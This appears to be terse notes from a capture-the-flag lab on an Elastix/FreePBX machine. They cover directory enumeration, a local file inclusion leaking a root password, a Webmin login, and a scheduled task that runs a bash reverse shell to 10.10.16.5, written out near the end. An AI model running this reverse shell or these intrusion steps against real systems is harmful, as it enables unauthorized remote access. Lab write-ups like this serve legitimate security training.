- the webpage cannot be loaded due to Firefox and other browsers changing their min TLS version to a number higher than what the box supports
- Port 80 just returns a redirect to port 443 / HTTPS where thereâ€™s an an Elastix login page
- dirb shows us there is an admin page /admin
- going to admin page it asks for authentication
- hiting cancel prompts us to this page https://10.10.10.7/admin/reports.php which provide info like freepx
- searching for exploit for freepbx version and elastix we found a lfi vulun
- poc for lfi

- viewing the page source the page seems readable and found different password but the one i guess is right is this **jEhdIekWmdjE**
- ssh as root with this password some problem with ssh come up
- so i try to go to port 10000 and found a webmin trying root and the password and i got in
- create a task as root in scheduled commands
- ```
  bash -c 'bash -i >& /dev/tcp/10.10.16.5/444 0>&1'
  ```
- and now we go aroot shell
